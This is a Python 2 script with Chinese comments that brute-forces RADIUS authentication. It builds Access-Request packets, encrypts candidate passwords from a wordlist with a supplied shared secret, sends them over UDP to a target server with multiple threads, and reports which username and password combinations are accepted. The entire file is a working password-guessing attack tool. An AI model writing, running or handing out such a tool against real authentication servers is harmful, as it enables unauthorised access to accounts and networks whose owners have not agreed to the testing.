#!/usr/bin/env python

from multiprocessing.dummy import Pool
import socket, hashlib, argparse, re, textwrap, sys, select

#  数字转换为hex格式
def int_2_hex(num, least_num_of_byte=1):
    hex_length = 2 * least_num_of_byte + 2
    return "{0:#0{1}x}".format(num, hex_length)[2:].decode("hex")


# 加密
def passwd_encrypt(shared_key, authenticator, password):
    chunk_size = 16

    pass_ary = [password[i:i + chunk_size] for i in range(0, len(password), chunk_size)]
    final = ""

    for chunk in pass_ary:
        if len(chunk) < chunk_size:
            chunk = (chunk.encode("hex") + "00" * (chunk_size - len(chunk))).decode("hex")
        md5 = hashlib.md5()
        try:
            xor

            md5.update(shared_key + xor)
        except NameError:
            #md5 xor
            md5.update(shared_key + authenticator)

        IV = md5.hexdigest()
        xor = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(chunk, IV.decode("hex")))
        final += xor

    return final


def radiuscrack(user):
    radius_code = "\x01"
    authenticator = "\x20\x20\x20\x20\x20\x20\x31\x34\x38\x35\x33\x37\x35\x35\x36\x33"

    for idx, pwd in enumerate(passwordlist):
        pack_id = int_2_hex(idx % 256)

        # 生成密码认证相关字段
        avp_pwd_type = "\x02"
        encrypted = passwd_encrypt(args.secret, authenticator, pwd)
        avp_pwd_len = len(encrypted) + len(avp_pwd_type) + 1
        avp_pwd_len_hex = int_2_hex(avp_pwd_len % 256)  #
        avp_uname_type = "\x01"
        avp_uname_len = len(user) + len(avp_uname_type) + 1
        avp_uname_len_hex = int_2_hex(avp_uname_len % 256)

        #预留空间
        pkt_len = avp_pwd_len + avp_uname_len + len(authenticator) + len(pack_id) + len(
            radius_code) + 2
        pkt_len_hex = int_2_hex(pkt_len % 65536, 2)

        # 发送试探数据包
        socket.sendto(
            radius_code + pack_id + pkt_len_hex + authenticator + avp_uname_type + avp_uname_len_hex + user + avp_pwd_type + avp_pwd_len_hex + encrypted,
            (args.ip, int(args.port)))
        ready = select.select([socket], [], [], 5)
        if ready[0]:
            resp_hex = socket.recv(2048).encode("hex")
            print(resp_hex)
            resp_code = resp_hex[:2]
            if resp_code == "02":
                print("success with secret: %s and password: %s" % (args.secret, pwd))
        else:
            print("Timeout")


# 参数解析
parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
                                 description=textwrap.dedent('''brute force authentication  Radius protocol''' ))

parser.add_argument('ip', metavar="IP", help="Required. The IP address where the radius service is running")
parser.add_argument('-P', '--port', dest="port", help="The port of the radius service. Default 1812", default=1812)
parser.add_argument('-u', '--username', dest="user", help="The username to be used.")
parser.add_argument('--userlist', dest="userlist", help="The list of users to be used.")
parser.add_argument('-p', '--password', dest="password", help="The password to be used.")
parser.add_argument('--passlist', dest="passlist", help="The list of passwords to be tried.")
parser.add_argument('-s', '--secret', dest="secret", help="Required. The shared secret to be used", required=True)
parser.add_argument('-t', '--thread', dest="thread", help="The number of threads to be used. Default 4", default=4)

args = parser.parse_args()

allusers = []
if args.userlist is not None:
    with open(args.userlist) as f:
        allusers = f.readlines()

if args.user is not None:
    allusers += [args.user]

if len(allusers) == 0:
    print("no users input.exit now")
    parser.print_help()
    sys.exit(2)

allusers = [x.strip() for x in allusers]
passwordlist = []
if args.passlist is not None:
    with open(args.passlist) as f:
        passwordlist += f.readlines()

if args.password is not None:
    passwordlist += [args.password]

if len(passwordlist) == 0:
    print("No password input. exit")
    parser.print_help()
    sys.exit(2)

passwordlist = [x.strip() for x in passwordlist]

#初始化
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
socket.setblocking(0)

pool = Pool(int(args.thread))
pool.map(radiuscrack, allusers)

pool.close()
pool.join()
